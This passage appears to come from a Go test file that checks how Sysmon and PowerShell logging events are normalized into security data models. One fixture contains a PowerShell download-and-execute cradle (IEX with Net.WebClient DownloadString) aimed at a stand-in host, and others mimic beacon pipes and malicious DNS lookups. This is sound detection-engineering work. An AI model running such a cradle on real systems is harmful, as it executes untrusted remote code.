		"datamodel": "Registry", "action": "created", "registry_key_name": "Evil",
	})
	expect(t, sysmon(15, "File stream created:", `Image: C:\Program Files\Mozilla Firefox\firefox.exe`,
		`TargetFilename: C:\Users\bob\Downloads\setup.exe:Zone.Identifier`, "Hash: SHA256=ABCD,IMPHASH=00",
		`Contents: [ZoneTransfer]  ZoneId=3`), map[string]any{
		"datamodel": "Filesystem", "action": "created", "signature": "File stream created", "file_name": "setup.exe:Zone.Identifier",
		"file_hash": "abcd", "file_hashes": "SHA256=ABCD,IMPHASH=00", "file_contents": "[ZoneTransfer]  ZoneId=3", "process_name": "firefox.exe",
	})
	expect(t, sysmon(17, "Pipe Created:", "EventType: CreatePipe", `PipeName: \MSSE-1234-server`, `Image: C:\Users\bob\beacon.exe`), map[string]any{
		"datamodel": "Endpoint", "signature": "Pipe Created", "pipe_name": `\MSSE-1234-server`, "pipe_event_type": "CreatePipe", "process_name": "beacon.exe",
	})
	expect(t, sysmon(18, "Pipe Connected:", "EventType: ConnectPipe", `PipeName: \lsarpc`, `Image: C:\x.exe`), map[string]any{
		"datamodel": "Endpoint", "signature": "Pipe Connected", "pipe_name": `\lsarpc`, "pipe_event_type": "ConnectPipe",
	})
	expect(t, sysmon(22, "Dns query:", `Image: C:\x.exe`, "QueryName: bad.example", "QueryStatus: 9003", "QueryResults: -"), map[string]any{
		"datamodel": "Network_Resolution", "query": "bad.example", "reply_code": "NXDomain", "process_name": "x.exe",
	})

	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}})
	expect(t, Normalize("win.powershell", decode(t, string(b)), now).Document(), map[string]any{
		"datamodel": "Script", "script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')",
		"script_block_id": "5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10", "script_part": int64(2), "script_parts": int64(3),
	})
}
